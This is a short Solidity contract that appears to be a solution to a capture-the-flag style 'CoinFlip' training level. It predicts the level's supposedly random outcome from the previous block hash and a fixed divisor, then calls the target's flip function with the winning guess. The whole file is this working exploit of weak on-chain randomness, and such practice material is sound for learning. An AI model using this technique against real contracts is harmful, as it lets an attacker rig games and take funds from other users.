// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/CoinFlip.sol";

contract CoinFlipattract{
    uint public account = 0;
    function att(address addr) public  {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        if (side == true) {
            CoinFlip(addr).flip(true);
            account+=1;
        }else{
            CoinFlip(addr).flip(false);
            account+=1;
        }
    }
}